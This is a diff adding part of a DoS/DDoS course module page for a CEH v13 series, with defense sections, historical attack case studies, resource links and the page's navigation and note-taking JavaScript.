+                        <p>Specifically for application-layer attacks that slip past volume-based defenses. A <span class="term" data-term="waf">WAF</span> inspects HTTP requests and applies behavioral analysis to separate genuine users from a flood of legitimate-looking malicious requests — the only effective answer to sophisticated Layer 7 attacks.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>How cloud scrubbing works</h3>
+                <p>Cloud DDoS mitigation is worth understanding in a little depth because it is now the backbone of real-world defense. The provider positions itself between the internet and your servers — typically by having your DNS point at their network, or via BGP routing that draws your traffic through their scrubbing centers. Because these providers operate <strong>anycast</strong> networks with data centers worldwide, an incoming attack is automatically distributed across their entire global capacity rather than concentrated on one link. Each scrubbing center inspects the traffic, drops what its detection systems classify as malicious, and passes clean traffic to your origin. The largest providers absorb and filter attacks measured in tens of terabits per second <em>automatically</em>, which is exactly how the record 31.4 Tbps attack was mitigated in seconds. For most organizations, subscribing to such a service is the single most effective DDoS decision they can make.</p>
+                <div class="info-box">
+                    <p><strong>The strategic point:</strong> DDoS defense has become a matter of leverage rather than local strength. You cannot win a bandwidth contest against a million-device botnet — but you can stand behind a provider whose network is bigger than the botnet. The defense scales by borrowing scale, the mirror image of how the attack scales by borrowing devices.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Preparation: the incident response plan</h3>
+                <p>Technology is only half of readiness. Because a DDoS attack is a crisis that unfolds in minutes, organizations that weather them well have prepared in advance: a written <strong>DDoS response plan</strong> naming who does what, pre-established contacts with their ISP and mitigation provider, the ability to reroute traffic quickly, and runbooks rehearsed before the attack rather than improvised during it. A recurring theme in post-incident analysis is that the organizations that recovered fastest were not those with the most hardware, but those who had practiced. And because DDoS is increasingly used as a <em>smokescreen</em> for a simultaneous intrusion, the response plan should include watching for other malicious activity while attention is consumed by the flood.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["case-studies"]'>Next → Case Studies</button>
+        </section>
+
+            <!-- Case Studies Section -->
+            <section id="case-studies" class="module-section" role="tabpanel" aria-labelledby="tab-case-studies" tabindex="0" hidden="">
+            <h2 class="section-title">📚 Real-World Case Studies</h2>
+
+            <div class="card">
+                <h3>Learning from the record books</h3>
+                <p>The history of major DDoS attacks is a history of escalation, and each landmark attack introduced a technique or crossed a threshold that changed how defenders think. Studying them chronologically shows the arms race in motion: each record-breaker forced a defensive response, which attackers then worked to overcome. The following cases are the ones every security professional should know.</p>
+            </div>
+
+            <div class="card">
+                <h3>2016 — Mirai and the Dyn attack: the IoT wake-up call</h3>
+                <p>The Mirai botnet attacks of 2016 are the most historically important in this list because they proved a new category of threat. By conscripting hundreds of thousands of insecure IoT devices — cameras, routers, DVRs with default passwords — Mirai launched roughly 1 Tbps attacks that were unprecedented at the time. The attack on DNS provider <strong>Dyn</strong> was especially instructive: rather than attack popular sites directly, it took down the DNS infrastructure they depended on, cascading into outages at Netflix, Twitter, Reddit, and PayPal. The lessons were twofold and lasting: the ocean of insecure IoT devices is a strategic vulnerability for the entire internet, and attacking shared infrastructure (like DNS) multiplies impact far beyond the direct target. Mirai's source code was published, seeding every major botnet since.</p>
+            </div>
+
+            <div class="card">
+                <h3>2018 — GitHub and Memcached amplification: efficiency over volume</h3>
+                <p>In 2018, GitHub was hit by what was then the largest recorded attack, peaking at 1.35 Tbps — but the remarkable part was <em>how</em>. The attackers used <strong>Memcached amplification</strong>, abusing thousands of exposed Memcached servers that would reply to a tiny spoofed request with an enormous response, achieving amplification factors up to 51,200×. It demonstrated that attackers did not need to build a massive botnet if they could borrow the bandwidth of misconfigured internet infrastructure. The equally instructive part was the defense: GitHub's cloud mitigation provider absorbed and scrubbed the attack in under ten minutes, a preview of the cloud-scale defense that is now standard. The lasting lesson: exposed, unauthenticated UDP services are dangerous reflectors, and securing them is a shared responsibility of the whole internet.</p>
+            </div>
+
+            <div class="card">
+                <h3>2023 — HTTP/2 Rapid Reset: a protocol flaw at scale</h3>
+                <p>In 2023, Google, Cloudflare, and AWS jointly disclosed a novel application-layer technique, <strong>HTTP/2 Rapid Reset</strong> (CVE-2023-44487), that powered an attack peaking at 398 million requests per second — far beyond any prior Layer 7 attack. Rather than volume, it exploited a design feature of the HTTP/2 protocol: a client could open a request and immediately cancel it, and by automating this at scale, attackers forced servers to perform the expensive setup for millions of requests per second while spending almost nothing themselves. It was a landmark because it showed that a flaw in a widely-deployed protocol could instantly become a record-breaking weapon, requiring coordinated patching across the entire industry. The lesson: application-layer attacks, not raw volume, represent the sophisticated frontier.</p>
+            </div>
+
+            <div class="card">
+                <h3>2025 — Aisuru and the 31.4 Tbps era: the new normal</h3>
+                <p>By late 2025, the <strong>Aisuru-Kimwolf</strong> botnet — a Mirai descendant of one to four million devices — had driven the record to <strong>31.4 Tbps</strong>, in an attack that lasted just 35 seconds and was mitigated automatically. What makes this era distinct is not only the raw size but its normalization: hyper-volumetric attacks exceeding 1 Tbps, once a yearly headline, now occur dozens of times a day, and botnet capacity is rented out cheaply as a service. The defining lesson of the current era is that scale has become routine and defense has fully industrialized — the attacks are now mitigated automatically by cloud providers whose networks exceed the botnets' capacity, because human-speed response is far too slow for a 35-second attack.</p>
+            </div>
+
+            <div class="card">
+                <h3>The through-line</h3>
+                <p>Across a decade, three patterns hold. <strong>Attacks escalate relentlessly</strong> — from 1 Tbps to 31 Tbps in nine years — so defenses sized for today's attacks are undersized for tomorrow's. <strong>Efficiency innovations matter as much as scale</strong> — Memcached amplification and HTTP/2 Rapid Reset each broke records not with bigger botnets but with cleverer abuse of existing infrastructure. And <strong>defense has moved to the cloud and to automation</strong>, because the scale and speed of modern attacks have outrun any on-premises or human-speed response. These are the enduring conclusions to carry out of the module.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["quiz"]'>Next → Assessment</button>
+        </section>
+
+            <!-- Quiz Section -->
+            <section id="quiz" class="module-section" role="tabpanel" aria-labelledby="tab-quiz" tabindex="0" hidden="">
+                <h2 class="section-title">📝 Module 10 Assessment</h2>
+                
+                <div class="card">
+                    <h3>🎯 Comprehensive Knowledge Evaluation</h3>
+                    <p>Test your understanding of DoS/DDoS concepts, attack techniques, detection methods, and countermeasures with this comprehensive assessment.</p>
+                    
+                    <div style="background: linear-gradient(135deg, rgba(52, 152, 219, 0.1), rgba(41, 128, 185, 0.1)); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                        <strong>Assessment Details:</strong>
+                        <ul style="margin: 10px 0; padding-left: 20px;">
+                            <li>20 multiple-choice questions</li>
+                            <li>Passing score: 80% (16/20 correct)</li>
+                            <li>Time limit: 30 minutes</li>
+                            <li>Covers all Module 10 topics</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="quiz-container" id="quizContainer">
+                    <!-- Quiz questions will be populated by JavaScript -->
+                </div>
+
+                <div class="card" id="quizResults" style="display: none;">
+                    <h3>📊 Assessment Results</h3>
+                    <div id="resultsContent">
+                        <!-- Results will be populated by JavaScript -->
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-action="showSection" data-args='["resources"]'>View Resources →</button>
+            </section>
+
+            <!-- Resources Section -->
+            <section id="resources" class="module-section" role="tabpanel" aria-labelledby="tab-resources" tabindex="0" hidden="">
+                <h2 class="section-title">📚 Essential Resources &amp; References</h2>
+                
+                <div class="card">
+                    <h3>🎯 Official CEH v13 Resources</h3>
+                    <div class="resources-grid">
+                        <div class="resource-card">
+                            <h4>🏢 EC-Council Official</h4>
+                            <ul style="line-height: 1.8;">
+                                <li><a href="https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/" target="_blank">CEH v13 Certification Page</a></li>
+                                <li><a href="https://www.eccouncil.org/cehv13-brochure/" target="_blank">CEH v13 Official Brochure</a></li>
+                                <li><a href="https://www.eccouncil.org/cybersecurity-exchange/" target="_blank">EC-Council Cybersecurity Exchange</a></li>
+                                <li><a href="https://ilabs.eccouncil.org/" target="_blank">EC-Council iLabs Platform</a></li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>📖 Technical Documentation</h4>
+                            <ul style="line-height: 1.8;">
+                                <li><a href="https://www.cloudflare.com/learning/ddos/" target="_blank">Cloudflare DDoS Learning Center</a></li>
+                                <li><a href="https://www.akamai.com/resources/ddos-protection" target="_blank">Akamai DDoS Protection Resources</a></li>
+                                <li><a href="https://aws.amazon.com/shield/ddos-attack-protection/" target="_blank">AWS Shield DDoS Protection</a></li>
+                                <li><a href="https://www.netscout.com/what-is-ddos" target="_blank">Netscout DDoS Research</a></li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>🔧 Tools &amp; Utilities</h4>
+                            <ul style="line-height: 1.8;">
+                                <li><a href="https://nmap.org/nping/" target="_blank">Nping - Network Packet Generation</a></li>
+                                <li><a href="https://www.hping.org/" target="_blank">hping3 - Active Network Smashing Tool</a></li>
+                                <li><a href="https://scapy.net/" target="_blank">Scapy - Packet Manipulation Library</a></li>
+                                <li><a href="https://www.wireshark.org/" target="_blank">Wireshark - Network Protocol Analyzer</a></li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>📊 Research &amp; Reports</h4>
+                            <ul style="line-height: 1.8;">
+                                <li><a href="https://www.netscout.com/threatreport" target="_blank">Netscout Threat Intelligence Report</a></li>
+                                <li><a href="https://www.kaspersky.com/blog/ddos-report-q3-2023/" target="_blank">Kaspersky DDoS Reports</a></li>
+                                <li><a href="https://radar.cloudflare.com/" target="_blank">Cloudflare Radar - Internet Insights</a></li>
+                                <li><a href="https://www.f5.com/labs/ddos" target="_blank">F5 Labs DDoS Research</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎓 Advanced Learning Resources</h3>
+                    <div class="resources-grid">
+                        <div class="resource-card">
+                            <h4>📚 Books &amp; Publications</h4>
+                            <ul style="line-height: 1.8;">
+                                <li>"DDoS Attacks: Evolution, Detection, Prevention, and Reaction" by Christos Douligeris</li>
+                                <li>"Network Security Assessment" by Chris McNab</li>
+                                <li>"The Web Application Hacker's Handbook" by Dafydd Stuttard</li>
+                                <li>"Practical Malware Analysis" by Michael Sikorski</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>🌐 Online Courses</h4>
+                            <ul style="line-height: 1.8;">
+                                <li>SANS SEC542: Web App Penetration Testing</li>
+                                <li>Cybrary: Advanced Penetration Testing</li>
+                                <li>Pluralsight: Ethical Hacking Series</li>
+                                <li>Udemy: Complete Ethical Hacking Course</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>🏆 Certifications</h4>
+                            <ul style="line-height: 1.8;">
+                                <li>CEH Master: Advanced practical certification</li>
+                                <li>GCIH: SANS Incident Handler</li>
+                                <li>CISSP: Information Systems Security Professional</li>
+                                <li>CCSP: Cloud Security Professional</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>🔬 Research Organizations</h4>
+                            <ul style="line-height: 1.8;">
+                                <li>NIST Cybersecurity Framework</li>
+                                <li><span class="term" data-term="owasp">OWASP</span> Application Security</li>
+                                <li>SANS Institute Research</li>
+                                <li>IEEE Security &amp; Privacy</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        
+    
+
+    
+    </main>
+
+    <nav class="course-nav" aria-label="Course navigation">
+        <a href="ceh_module9.html" rel="prev">← Module 9</a>
+        <a class="is-home" href="index.html">Course home</a>
+        <a class="is-aux" href="cheatsheet-dos.html" target="_blank" rel="noopener">Cheat sheet</a>
+        <a class="is-aux" href="glossary.html" target="_blank" rel="noopener">Glossary</a>
+        <a href="ceh_module11.html" rel="next">Module 11 →</a>
+    </nav>
+
+    <footer class="module-footer">
+        <p class="legal"><strong>Authorized testing only.</strong> Every technique in this module is
+        presented for defensive education and authorized assessment. Running these tools against
+        systems you do not own or have written permission to test is illegal in most jurisdictions.</p>
+        <p>CEH v13 Course Series · Module 10 · Brookdale Community College · 2026</p>
+    </footer>
+</div>
+
+<div id="detailModal" class="modal" role="dialog" aria-modal="true"
+     aria-labelledby="modalContent" aria-hidden="true">
+    <div class="modal-content">
+        <button class="close" type="button" data-action="closeModal" aria-label="Close dialog">&times;</button>
+        <div id="modalContent"></div>
+    </div>
+</div>
+
+<button id="notesToggle" class="notes-fab" type="button"
+        aria-expanded="false" aria-controls="notesPanel" aria-label="Open notes">
+    <span class="notes-fab__icon" aria-hidden="true">📝</span>
+    <span class="notes-fab__text">Notes</span>
+    <span id="notesDot" class="notes-fab__dot" hidden aria-hidden="true"></span>
+</button>
+
+<div id="notesPanel" class="notes-panel" role="dialog" aria-modal="false"
+     aria-label="Study notes" aria-hidden="true">
+    <div class="notes-panel__head">
+        <span class="notes-panel__title">Notes</span>
+        <button id="notesClose" class="notes-panel__close" type="button" aria-label="Close notes">&times;</button>
+    </div>
+    <div class="notes-tabs" role="group" aria-label="Notes scope">
+        <button id="notesTabSection" class="notes-tab" type="button" aria-pressed="true">This section</button>
+        <button id="notesTabScratch" class="notes-tab" type="button" aria-pressed="false">Scratchpad</button>
+    </div>
+    <p id="notesScopeLabel" class="notes-panel__scope">Notes for this section</p>
+    <div class="notes-panel__body">
+        <textarea id="notesArea" class="notes-area" aria-label="Note text"
+                  spellcheck="true"></textarea>
+    </div>
+    <div class="notes-panel__foot">
+        <span class="notes-hint">Saved automatically</span>
+        <button id="notesClear" class="notes-mini is-danger" type="button">Clear</button>
+        <button id="notesExport" class="notes-mini" type="button">Export .md</button>
+    </div>
+</div>
+
+<div id="notification" class="notification" role="status" aria-live="polite"></div>
+
+<script>
+/* ============================================================
+   CEH v13 COURSE CHASSIS  v1.0
+   Shared controller: theming, text size, navigation, progress,
+   modal, notifications, and CSP-safe event dispatch.
+
+   CSP-safe: every handler is bound with addEventListener.
+   Markup uses data-action="name" instead of onclick="name()".
+   Register module-specific behaviour with CEH.register({...}).
+   ============================================================ */
+var CEH = (function () {
+  'use strict';
+
+  var MODULE_ID = document.documentElement.getAttribute('data-module') || 'unknown';
+  var PREFS_KEY = 'ceh:prefs:v1';               // shared across all modules
+  var STATE_KEY = 'ceh:progress:' + MODULE_ID;  // per module
+  var NOTES_KEY = 'ceh:notes:' + MODULE_ID;     // per module (per-section + scratchpad)
+
+  var SCALES = [0.9, 1, 1.15, 1.3];
+  var actions = Object.create(null);
+  var sectionOrder = [];
+  var current = null;
+  var visited = [];
+  var lastFocus = null;
+
+  /* ---------- storage (Safari private mode throws) ---------- */
+  function read(key, fallback) {
+    try {
+      var raw = localStorage.getItem(key);
+      return raw ? JSON.parse(raw) : fallback;
+    } catch (e) { return fallback; }
+  }
+  function write(key, value) {
+    try { localStorage.setItem(key, JSON.stringify(value)); } catch (e) { /* no-op */ }
+  }
+
+  /* ---------- preferences: theme + text size ---------- */
+  var prefs = read(PREFS_KEY, {});
+
+  function systemTheme() {
+    return window.matchMedia &&
+           window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+  }
+
+  function applyTheme(theme) {
+    document.documentElement.setAttribute('data-theme', theme);
+    var btn = document.getElementById('themeToggle');
+    if (btn) {
+      var dark = theme === 'dark';
+      btn.setAttribute('aria-pressed', String(dark));
+      btn.querySelector('.ctl__icon').textContent = dark ? '🌙' : '☀️';
+      btn.querySelector('.ctl__text').textContent = dark ? 'Dark' : 'Light';
+      btn.setAttribute('aria-label', 'Switch to ' + (dark ? 'light' : 'dark') + ' theme');
+    }
+  }
+
+  function setTheme(theme) {
+    prefs.theme = theme;
+    write(PREFS_KEY, prefs);
+    applyTheme(theme);
+  }
+
+  function applyScale(idx) {
+    idx = Math.max(0, Math.min(SCALES.length - 1, idx));
+    prefs.scaleIndex = idx;
+    document.documentElement.style.setProperty('--font-scale', SCALES[idx]);
+    var pct = Math.round(SCALES[idx] * 100) + '%';
+    var out = document.getElementById('fontSizeValue');
+    if (out) out.textContent = pct;
+    var dec = document.getElementById('fontDec');
+    var inc = document.getElementById('fontInc');
+    if (dec) dec.disabled = idx === 0;
+    if (inc) inc.disabled = idx === SCALES.length - 1;
+    announce('Text size ' + pct);
+  }
+
+  function setScale(idx) { applyScale(idx); write(PREFS_KEY, prefs); }
+
+  /* ---------- live region ---------- */
+  function announce(msg) {
+    var el = document.getElementById('a11yStatus');
+    if (el) el.textContent = msg;
+  }
+
+  /* ---------- navigation ---------- */
+  function tabs() {
+    return Array.prototype.slice.call(document.querySelectorAll('.nav-btn'));
+  }
+
+  function showSection(id, opts) {
+    var panel = document.getElementById(id);
+    if (!panel) return;
+    opts = opts || {};
+
+    document.querySelectorAll('.module-section').forEach(function (s) {
+      s.classList.remove('active');
+      s.setAttribute('hidden', '');
+    });
+    panel.classList.add('active');
+    panel.removeAttribute('hidden');
+
+    tabs().forEach(function (t) {
+      var on = t.getAttribute('data-target') === id;
+      t.setAttribute('aria-selected', String(on));
+      t.setAttribute('tabindex', on ? '0' : '-1');
+      t.classList.toggle('active', on);
+    });
+
+    // flush the OUTGOING section's note under the old `current` before it changes
+    var notesPanel = document.getElementById('notesPanel');
+    var notesFollow = notesPanel && notesPanel.classList.contains('open') && notesScope === 'section';
+    if (notesFollow) flushNotes();
+
+    current = id;
+    if (visited.indexOf(id) === -1) visited.push(id);
+    saveProgress();
+    updateProgress();
+
+    // now render the incoming section's note under the new `current`
+    if (notesFollow) renderNotesPanel();
+
+    if (opts.focusTab) {
+      var tab = document.querySelector('.nav-btn[data-target="' + id + '"]');
+      if (tab) tab.focus();
+    }
+    if (!opts.silent) {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      var heading = panel.querySelector('.section-title');
+      announce((heading ? heading.textContent.trim() : id) + ' — section ' +
+               (sectionOrder.indexOf(id) + 1) + ' of ' + sectionOrder.length);
+    }
+  }
+
+  function step(delta) {
+    var i = sectionOrder.indexOf(current) + delta;
+    if (i >= 0 && i < sectionOrder.length) showSection(sectionOrder[i]);
+  }
+
+  function updateProgress() {
+    var pct = sectionOrder.length ? Math.round(visited.length / sectionOrder.length * 100) : 0;
+    var fill = document.getElementById('progressFill');
+    var bar = document.getElementById('progressBar');
+    var text = document.getElementById('progressText');
+    if (fill) fill.style.width = pct + '%';
+    if (bar) bar.setAttribute('aria-valuenow', String(pct));
+    if (text) text.textContent = visited.length + ' of ' + sectionOrder.length + ' sections · ' + pct + '%';
+    tabs().forEach(function (t) {
+      var done = visited.indexOf(t.getAttribute('data-target')) !== -1;
+      var mark = t.querySelector('.nav-btn__done');
+      if (mark) mark.textContent = done ? '✓' : '';
+    });
+  }
+
+  function saveProgress() {
+    var s = read(STATE_KEY, {});
+    s.visited = visited;
+    s.current = current;
+    s.updated = Date.now();
+    write(STATE_KEY, s);
+  }
+
+  function getState() { return read(STATE_KEY, {}); }
+  function setState(patch) {
+    var s = read(STATE_KEY, {});
+    for (var k in patch) if (Object.prototype.hasOwnProperty.call(patch, k)) s[k] = patch[k];
+    s.updated = Date.now();
+    write(STATE_KEY, s);
+  }
+
+  function resetProgress() {
+    try { localStorage.removeItem(STATE_KEY); } catch (e) {}
+    visited = [];
+    showSection(sectionOrder[0]);
+    updateProgress();
+    notify('Progress for this module has been cleared.', 'warning');
+  }
+
+  /* ---------- modal ---------- */
+  function openModal(title, html) {
+    var modal = document.getElementById('detailModal');
+    var body = document.getElementById('modalContent');
+    if (!modal || !body) return;
+    lastFocus = document.activeElement;
+    body.innerHTML = (title ? '<h3>' + title + '</h3>' : '') + (html || '');
+    modal.classList.add('open');
+    modal.setAttribute('aria-hidden', 'false');
+    var close = modal.querySelector('.close');
+    if (close) close.focus();
+  }
+
+  // Legacy modules defined showModal with two different signatures:
+  // showModal(content) and showModal(title, content). Accept both.
+  function showModal(a, b) {
+    if (b === undefined) openModal('', a);
+    else openModal(a, b);
+  }
+
+  function closeModal() {
+    var modal = document.getElementById('detailModal');
+    if (!modal) return;
+    modal.classList.remove('open');
+    modal.setAttribute('aria-hidden', 'true');
+    if (lastFocus && lastFocus.focus) lastFocus.focus();
+  }
+
+  function trapFocus(e) {
+    var modal = document.getElementById('detailModal');
+    if (!modal || !modal.classList.contains('open') || e.key !== 'Tab') return;
+    var f = modal.querySelectorAll('a[href],button:not([disabled]),input,select,textarea,[tabindex]:not([tabindex="-1"])');
+    if (!f.length) return;
+    var first = f[0], last = f[f.length - 1];
+    if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }
+    else if (!e.shiftKey && document.activeElement === last) { e.preventDefault(); first.focus(); }
+  }
+
+  /* ---------- notifications ---------- */
+  var notifyTimer;
+  function notify(message, type) {
+    var el = document.getElementById('notification');
+    if (!el) return;
+    el.className = 'notification show' + (type && type !== 'success' ? ' ' + type : '');
+    el.textContent = message;
+    announce(message);
+    clearTimeout(notifyTimer);
+    notifyTimer = setTimeout(function () { el.className = 'notification'; }, 3600);
+  }
+
+  /* ---------- notes ----------
+     Two scopes stored under one per-module key:
+       notes.scratch          = module-wide scratchpad
+       notes.sections[sectionId] = per-section note
+     The popup shows a tab for the current section and a tab for the scratchpad,
+     auto-saving on input (debounced). Export produces a Markdown file. */
+  var notes = null;
+  var notesScope = 'section';       // 'section' | 'scratch'
+  var notesSaveTimer = null;
+  var notesLastFocus = null;
+
+  function loadNotes() {
+    if (notes) return notes;
+    notes = read(NOTES_KEY, { scratch: '', sections: {} });
+    if (!notes.sections) notes.sections = {};
+    if (typeof notes.scratch !== 'string') notes.scratch = '';
+    return notes;
+  }
+
+  function saveNotes() {
+    write(NOTES_KEY, loadNotes());
+    updateNotesIndicator();
+  }
+
+  function currentNoteValue() {
+    var n = loadNotes();
+    return notesScope === 'scratch' ? n.scratch : (n.sections[current] || '');
+  }
+
+  function setCurrentNoteValue(v) {
+    var n = loadNotes();
+    if (notesScope === 'scratch') n.scratch = v;
+    else n.sections[current] = v;
+  }
+
+  function sectionTitle(id) {
+    var tab = document.querySelector('.nav-btn[data-target="' + id + '"]');
+    if (tab) return tab.textContent.replace(/[✓]/g, '').trim();
+    return id;
+  }
+
+  function hasAnyNotes() {
+    var n = loadNotes();
+    if (n.scratch && n.scratch.trim()) return true;
+    for (var k in n.sections) if (n.sections[k] && n.sections[k].trim()) return true;
+    return false;
+  }
+
+  function updateNotesIndicator() {
+    var dot = document.getElementById('notesDot');
+    if (dot) dot.hidden = !hasAnyNotes();
+  }
+
+  function renderNotesPanel() {
+    var area = document.getElementById('notesArea');
+    var label = document.getElementById('notesScopeLabel');
+    var secBtn = document.getElementById('notesTabSection');
+    var scratchBtn = document.getElementById('notesTabScratch');
+    if (!area) return;
+    if (secBtn) secBtn.setAttribute('aria-pressed', String(notesScope === 'section'));
+    if (scratchBtn) scratchBtn.setAttribute('aria-pressed', String(notesScope === 'scratch'));
+    if (label) {
+      label.textContent = notesScope === 'scratch'
+        ? 'Module scratchpad'
+        : 'Notes for: ' + sectionTitle(current);
+    }
+    area.value = currentNoteValue();
+    area.placeholder = notesScope === 'scratch'
+      ? 'A scratchpad for the whole module — anything not tied to one section.'
+      : 'Notes for this section. They reappear whenever you return to this tab.';
+  }
+
+  function openNotes() {
+    var panel = document.getElementById('notesPanel');
+    if (!panel) return;
+    loadNotes();
+    notesLastFocus = document.activeElement;
+    renderNotesPanel();
+    panel.classList.add('open');
+    panel.setAttribute('aria-hidden', 'false');
+    var area = document.getElementById('notesArea');
+    if (area) area.focus();
+    var toggle = document.getElementById('notesToggle');
+    if (toggle) toggle.setAttribute('aria-expanded', 'true');
+  }
+
+  function closeNotes() {
+    var panel = document.getElementById('notesPanel');
+    if (!panel) return;
+    flushNotes();
+    panel.classList.remove('open');
+    panel.setAttribute('aria-hidden', 'true');
+    var toggle = document.getElementById('notesToggle');
+    if (toggle) { toggle.setAttribute('aria-expanded', 'false'); toggle.focus(); }
+    else if (notesLastFocus && notesLastFocus.focus) notesLastFocus.focus();
+  }
+
+  function toggleNotes() {
+    var panel = document.getElementById('notesPanel');
+    if (panel && panel.classList.contains('open')) closeNotes();
+    else openNotes();
+  }
+
+  function setNotesScope(scope) {
+    flushNotes();
+    notesScope = scope === 'scratch' ? 'scratch' : 'section';
+    renderNotesPanel();
+    var area = document.getElementById('notesArea');
+    if (area) area.focus();
+  }
+
+  function onNotesInput() {
+    setCurrentNoteValue(document.getElementById('notesArea').value);
+    clearTimeout(notesSaveTimer);
+    notesSaveTimer = setTimeout(saveNotes, 400);
+  }
+
+  function flushNotes() {
+    var area = document.getElementById('notesArea');
+    if (!area) return;
+    setCurrentNoteValue(area.value);
+    clearTimeout(notesSaveTimer);
+    saveNotes();
+  }
+
+  function exportNotes() {
+    var n = loadNotes();
+    var title = (document.querySelector('.header h1') || {}).textContent || ('Module ' + MODULE_ID);
+    var lines = ['# Notes — ' + title.trim(), '', '_Exported ' + new Date().toLocaleString() + '_', ''];
+    sectionOrder.forEach(function (id) {
+      var v = n.sections[id];
+      if (v && v.trim()) {
+        lines.push('## ' + sectionTitle(id), '', v.trim(), '');
+      }
+    });
+    if (n.scratch && n.scratch.trim()) {
+      lines.push('## Scratchpad', '', n.scratch.trim(), '');
+    }
+    if (lines.length <= 4) {
+      notify('No notes to export yet.', 'warning');
+      return;
+    }
+    var blob = new Blob([lines.join('\n')], { type: 'text/markdown' });
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = 'ceh-' + MODULE_ID + '-notes.md';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
+    notify('Notes exported.');
+  }
+
+  function clearScopeNotes() {
+    var what = notesScope === 'scratch' ? 'the scratchpad' : 'notes for this section';
+    if (!window.confirm('Clear ' + what + '? This cannot be undone.')) return;
+    setCurrentNoteValue('');
+    var area = document.getElementById('notesArea');
+    if (area) area.value = '';
+    saveNotes();
+    notify('Cleared ' + what + '.', 'warning');
+  }
+
+  /* ---------- CSP-safe action dispatch ---------- */
+  function register(map) {
+    for (var name in map) {
+      if (Object.prototype.hasOwnProperty.call(map, name)) actions[name] = map[name];
+    }
+  }
+
+  function parseArgs(el) {
+    var raw = el.getAttribute('data-args');
+    if (!raw) return [];
+    var args;
+    try { args = JSON.parse(raw); } catch (e) { return [raw]; }
+    // legacy handlers took `this` as a positional argument; put the element back
+    return args.map(function (a) { return a === '__EL__' ? el : a; });
+  }
+
+  function el_closest(target, sel) {
+    return target && typeof target.closest === 'function' ? target.closest(sel) : null;
+  }
+
+  function onClick(e) {
+    // tabs carry data-target rather than data-action
+    var tab = el_closest(e.target, '.nav-btn');
+    if (tab && tab.getAttribute('data-target')) {
+      e.preventDefault();
+      showSection(tab.getAttribute('data-target'));
+      return;
+    }
+
+    var el = el_closest(e.target, '[data-action]');
+    if (!el) return;
+    var name = el.getAttribute('data-action');
+
+    if (name === 'showSection') { e.preventDefault(); showSection(parseArgs(el)[0]); return; }
+    if (name === 'closeModal')  { e.preventDefault(); closeModal(); return; }
+    if ((name === 'openModal' || name === 'showModal') && !actions[name]) {
+      e.preventDefault();
+      var a = parseArgs(el);
+      if (name === 'showModal') showModal(a[0], a[1]);
+      else openModal(a[0], a[1]);
+      return;
+    }
+    if (name === 'resetProgress') { e.preventDefault(); resetProgress(); return; }
+
+    var fn = actions[name];
+    if (typeof fn === 'function') {
+      e.preventDefault();
+      try { fn.apply(el, parseArgs(el).concat([e])); }
+      catch (err) {
+        console.error('[CEH] action "' + name + '" failed:', err);
+        notify('That demo could not run. See the browser console for details.', 'error');
+      }
+    } else {
+      console.warn('[CEH] no handler registered for action:', name);
+    }
+  }
+
+  /* ---------- roving tabindex on the tablist ---------- */
+  function onNavKey(e) {
+    var t = el_closest(e.target, '.nav-btn');
+    if (!t) return;
+    var list = tabs(), i = list.indexOf(t), next = null;
+    if (e.key === 'ArrowRight' || e.key === 'ArrowDown') next = list[(i + 1) % list.length];
+    else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') next = list[(i - 1 + list.length) % list.length];
+    else if (e.key === 'Home') next = list[0];
+    else if (e.key === 'End') next = list[list.length - 1];
+    if (next) { e.preventDefault(); showSection(next.getAttribute('data-target'), { focusTab: true }); }
+  }
+
+  function onGlobalKey(e) {
+    if (e.key === 'Escape') {
+      if (tipTarget) { var tt = tipTarget; tipSuppressed = tt; hideTip(); if (tt.focus) tt.focus(); return; }
+      var np = document.getElementById('notesPanel');
+      if (np && np.classList.contains('open')) { closeNotes(); return; }
+      closeModal(); return;
+    }
+    trapFocus(e);
+    var tag = (e.target && e.target.tagName || '').toLowerCase();
+    if (tag === 'input' || tag === 'textarea' || tag === 'select') return;
+    if (el_closest(e.target, '.nav-btn')) return;   // handled by roving tabindex
+    if (e.altKey && e.key === 'ArrowRight') { e.preventDefault(); step(1); }
+    if (e.altKey && e.key === 'ArrowLeft')  { e.preventDefault(); step(-1); }
+  }
+
+  /* ---------- ambient effect ---------- */
+  function matrixEffect() {
+    if (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+    var host = document.getElementById('matrixBg');
+    if (!host) return;
+    var chars = '01アカサタナハマヤラワ';
+    for (var i = 0; i < 18; i++) {
+      (function (n) {
+        setTimeout(function () {
+          var s = document.createElement('span');
+          s.className = 'matrix-line';
+          s.textContent = chars[Math.floor(Math.random() * chars.length)];
+          s.style.left = (Math.random() * 100) + '%';
+          s.style.animationDelay = (Math.random() * 6) + 's';
+          s.style.animationDuration = (6 + Math.random() * 6) + 's';
+          host.appendChild(s);
+        }, n * 110);
+      })(i);
+    }
+  }
+
+  /* ---------- glossary + tooltips ----------
+     Author terms two ways:
+       <span class="term" data-tip="inline definition">phrase</span>
+       <span class="term" data-term="salt">salt</span>   (pulled from GLOSSARY)
+     A single floating bubble is positioned under (or over) the term.
+     Works on hover, keyboard focus, and tap; dismisses on Escape / outside tap.
